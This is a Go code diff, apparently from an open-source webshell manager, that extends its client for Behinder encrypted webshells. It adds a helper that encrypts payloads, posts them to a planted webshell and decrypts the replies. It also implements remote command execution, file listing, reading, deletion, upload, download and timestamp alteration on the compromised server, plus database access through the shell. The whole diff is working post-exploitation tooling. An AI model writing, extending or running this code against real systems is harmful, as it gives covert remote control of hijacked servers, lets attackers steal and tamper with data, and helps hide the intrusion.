@@ -9,6 +9,7 @@ import (
 	"github.com/go0p/wsm/lib/shell"
 	"github.com/go0p/wsm/lib/shell/behinder"
 	"github.com/go0p/wsm/lib/utils"
+	"io/ioutil"
 )
 
 type BehinderInfo struct {
@@ -59,9 +60,15 @@ func (b *BehinderInfo) setParams(i interface{}, p shell.IParams) (map[string]str
 	if p == nil {
 		switch i.(type) {
 		case *behinder.PingParams:
-			i.(*behinder.PingParams).SetDefaultAndCheckValue()
+			err = i.(*behinder.PingParams).SetDefaultAndCheckValue()
+			if err != nil {
+				return nil, err
+			}
 		case *behinder.BasicInfoParams:
-			i.(*behinder.BasicInfoParams).SetDefaultAndCheckValue()
+			err = i.(*behinder.BasicInfoParams).SetDefaultAndCheckValue()
+			if err != nil {
+				return nil, err
+			}
 		default:
 			return nil, errors.New(fmt.Sprintf("%v is undefined", i))
 		}
@@ -70,7 +77,10 @@ func (b *BehinderInfo) setParams(i interface{}, p shell.IParams) (map[string]str
 			return nil, err
 		}
 	} else {
-		p.SetDefaultAndCheckValue()
+		err = p.SetDefaultAndCheckValue()
+		if err != nil {
+			return nil, err
+		}
 		params, err = utils.ToMapParams(p)
 		if err != nil {
 			return nil, err
@@ -85,6 +95,28 @@ func (b *BehinderInfo) processParams(p map[string]string) {
 		delete(p, "forcePrint")
 		delete(p, "notEncrypt")
 	}
+}
+
+func (b *BehinderInfo) sendPayload(params map[string]string, className string) (shell.IResult, error) {
+	data, err := behinder.GetPayload(b.secretKey, className, params, b.Script, b.encryptMode)
+	if err != nil {
+		return nil, err
+	}
+	resp, err := b.Client.DoHttpRequest(b.Url, data)
+	if err != nil {
+		return nil, err
+	}
+
+	resData, err := behinder.Decrypto(resp.RawBody, b.secretKey, b.Script, params["notEncrypt"], b.encryptMode, b.prefixLen, b.suffixLen)
+	if err != nil {
+		return nil, err
+	}
+	result := newBResult(resData)
+	err = result.Parser()
+	if err != nil {
+		return nil, err
+	}
+	return result, nil
 }
 
 func (b *BehinderInfo) Ping(p ...shell.IParams) (bool, error) {
@@ -161,15 +193,88 @@ func (b *BehinderInfo) BasicInfo(p ...shell.IParams) (shell.IResult, error) {
 		return nil, err
 	}
 	b.processParams(params)
-	data, err := behinder.GetPayload(b.secretKey, "BasicInfoGo", params, b.Script, b.encryptMode)
+	return b.sendPayload(params, "BasicInfoGo")
+}
+
+func (b *BehinderInfo) CommandExec(p shell.IParams) (shell.IResult, error) {
+	params, err := utils.ToMapParams(p.(*behinder.ExecParams))
 	if err != nil {
 		return nil, err
+	}
+	b.processParams(params)
+	return b.sendPayload(params, "CmdGo")
+}
+
+func (b *BehinderInfo) setFileManagementParams(p shell.IParams) (map[string]string, error) {
+	err := p.SetDefaultAndCheckValue()
+	if err != nil {
+		return nil, err
+	}
+	params, err := utils.ToMapParams(p)
+	if err != nil {
+		return nil, err
+	}
+	switch p.(type) {
+	case *behinder.ListFiles:
+		params["mode"] = "list"
+	case *behinder.ShowFile:
+		params["mode"] = "show"
+	case *behinder.DeleteFile:
+		params["mode"] = "delete"
+	case *behinder.UploadFile:
+		params["mode"] = "create"
+	case *behinder.AppendFile:
+		params["mode"] = "append"
+	case *behinder.DownloadFile:
+		params["mode"] = "download"
+	case *behinder.RenameFile:
+		params["mode"] = "rename"
+	case *behinder.CreateFile:
+		params["mode"] = "createFile"
+	case *behinder.CreateDirectory:
+		params["mode"] = "createDirectory"
+	case *behinder.GetTimeStamp:
+		params["mode"] = "getTimeStamp"
+	case *behinder.UpdateTimeStamp:
+		params["mode"] = "updateTimeStamp"
+	default:
+		return nil, errors.New(fmt.Sprintf("%v is undefined", p))
+	}
+	return params, nil
+}
+
+func (b *BehinderInfo) FileManagement(p shell.IParams) (shell.IResult, error) {
+	params, err := b.setFileManagementParams(p)
+	if err != nil {
+		return nil, err
+	}
+	fmt.Println(params)
+	b.processParams(params)
+	data, err := behinder.GetPayload(b.secretKey, "FileOperationGo", params, b.Script, b.encryptMode)
+	if err != nil {
+		return nil, err
+	}
+	if _, ok := p.(*behinder.DownloadFile); ok {
+		resp, err := b.Client.DoHttpRequest(b.Url, data)
+		if err != nil {
+			return nil, err
+		}
+		localPath := p.(*behinder.DownloadFile).Path
+		err = ioutil.WriteFile(localPath, resp.RawBody, 0644)
+		if err != nil {
+			return nil, err
+		}
+		result := newBResult([]byte(params["path"] + ",下载完成"))
+		err = result.Parser()
+		if err != nil {
+			return nil, err
+		}
+		return result, nil
 	}
 	resp, err := b.Client.DoHttpRequest(b.Url, data)
 	if err != nil {
 		return nil, err
 	}
-
 	resData, err := behinder.Decrypto(resp.RawBody, b.secretKey, b.Script, params["notEncrypt"], b.encryptMode, b.prefixLen, b.suffixLen)
 	if err != nil {
 		return nil, err
@@ -182,6 +287,12 @@ func (b *BehinderInfo) BasicInfo(p ...shell.IParams) (shell.IResult, error) {
 	return result, nil
 }
 
-func (b *BehinderInfo) CommandExec(p shell.IParams) (shell.IResult, error) {
-	return nil, nil
+// DatabaseManagement 需要配合 JarLoad 插件加载数据库驱动
+func (b *BehinderInfo) DatabaseManagement(p shell.IParams) (shell.IResult, error) {
+	params, err := utils.ToMapParams(p.(*behinder.DBManagerParams))
+	if err != nil {
+		return nil, err
+	}
+	b.processParams(params)
+	return b.sendPayload(params, "DatabaseGo")
 }
